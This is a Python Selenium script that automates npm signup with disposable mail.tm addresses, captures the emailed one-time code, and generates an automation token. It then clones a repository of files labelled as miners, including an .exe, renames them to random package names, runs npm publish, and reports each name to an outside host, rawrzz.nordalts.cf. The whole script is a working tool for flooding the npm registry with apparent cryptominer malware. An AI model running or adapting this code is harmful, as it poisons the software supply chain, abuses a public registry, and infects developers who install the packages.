import undetected_chromedriver as uc
from selenium.webdriver import Chrome
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
import random
import json
import os
import requests
from selenium.webdriver.common.by import By
options = uc.ChromeOptions()

low_word = "abcdefghijklkmnopqrstuvwxyz"
upper_word = "ABDCEFGHIJKLMNOPQRSTUVWXYZ"
number = "1234567890"
symbols = "!@#$%&*"
username_for = low_word
password_for = low_word + upper_word + number + symbols
long_password = 16
long_username = 12
#xdr = "sendelp"
headers = {
    'cache-control': "no-cache",
    'content-type': "application/x-www-form-urlencoded"
    }
responsez = requests.request("GET", "https://rawrzz.nordalts.cf/gwetname", headers=headers)
xdr = responsez.text

passwordrepl = "rawr12!AAc"




options.add_argument('--no-first-run --no-service-autorun --password-store=basic') #wlacz to jak juz nie bedzie dev test
#options.user_data_dir = "rawr"
options.add_argument("--window-size=1920,1080")
#options.add_argument('--user-data-dir=rawr')
options.add_argument("--remote-debugging-port=38223")
driver = uc.Chrome(options=options, version_main=102)  # version_main allows to specify your chrome version instead of following chrome global version
driver.set_window_size(1920, 1080)

print("rawr")

usernamerepl = "".join(random.sample(username_for, long_username))
driver.get('https://mail.tm/')
time.sleep(4)
driver.find_element(By.XPATH, '//*[@id="logout"]').click()
time.sleep(4)
meow = driver.find_element(By.XPATH, '//*[@id="address"]').get_attribute("value")
print(meow)
driver.get("https://www.npmjs.com/signup")
time.sleep(5)
driver.find_element(By.XPATH, '//*[@id="signup_name"]').send_keys(usernamerepl)
time.sleep(1)
driver.find_element(By.XPATH, '//*[@id="signup_email"]').send_keys(meow)
time.sleep(1)
driver.find_element(By.XPATH, '//*[@id="signup_password"]').send_keys("cloudkid123!")
time.sleep(1)
driver.find_element(By.XPATH, '//*[@id="signup_eula-agreement"]').click()
time.sleep(1)
driver.find_element(By.XPATH, '/html/body/div/div/div[2]/main/div/section/div/form/button').click()
time.sleep(10)
driver.get("https://mail.tm/")
time.sleep(2)
driver.find_element(By.XPATH, '/html/body/div[1]/div/div/div[2]/main/div/div[2]/ul/li/a').click()
time.sleep(2)
farme = driver.find_element(By.XPATH, '//*[@id="iFrameResizer0"]')
driver.switch_to.frame(farme)
time.sleep(0.2)
rawr = driver.find_element(By.XPATH, '/html/body/table/tbody/tr/td/center/table/tbody/tr/td/table[2]/tbody/tr/td/div/table/tbody/tr/td[2]/div/p[3]/strong').text
driver.get("https://www.npmjs.com/login/email-otp?next=%2F")

time.sleep(2)
driver.find_element(By.XPATH, '//*[@id="login_otp"]').send_keys(rawr)
time.sleep(1)
driver.find_element(By.XPATH, '//*[@id="login"]/button').click()
driver.get("https://www.npmjs.com/settings/"+usernamerepl+"/tokens")
time.sleep(2)
driver.find_element(By.XPATH, '//*[@id="tokens"]/h2/a').click()
time.sleep(1)
#driver.find_element(By.XPATH, '//*[@id="escalate_escalated_password"]').send_keys("cloudkid123!")
driver.find_element(By.XPATH, '//*[@id="createtoken_name"]').send_keys(usernamerepl)
driver.find_element(By.XPATH, '//*[@id="createtoken_access_automation"]').click()
time.sleep(1)
driver.find_element(By.XPATH, '//*[@id="createtoken"]/button').click()
input("rawr")
rawrz = driver.find_element(By.XPATH,'//*[@id="main"]/div/div/div/div/div/div/pre/code/span').text
print(rawrz)
os.system("npm logout")
os.system('npm set registry "https://registry.npmjs.org/"')
os.system('npm set //registry.npmjs.org/:_authToken '+rawrz+'')

datz = "".join(random.sample(username_for, long_password))
os.system("rm -rf ref")
os.system("git clone https://github.com/fivembojufkarz2k21/ref.git")



os.system("cd ref && sed -i 's/CHANGEME/"+datz+"/g' package.json && cd server/src && sed -i 's/CHANGEME/"+datz+"/g' app.js && cd miners && mv CHANGEME "+datz+" && cd "+datz+" && mv CHANGEME.miner.js "+datz+".miner.js && sed -i 's/CHANGEME/"+datz+"/g' "+datz+".miner.js && mv CHANGEME "+datz+" && mv CHANGEME.exe "+datz+".exe && cd ../../../../ && npm publish")



tosendyez = "rawr="+datz
headers = {
    'cache-control': "no-cache",
    'content-type': "application/x-www-form-urlencoded"
    }
response = requests.request("POST", "https://rawrzz.nordalts.cf/rawrz", data=tosendyez, headers=headers)
print(response.text)
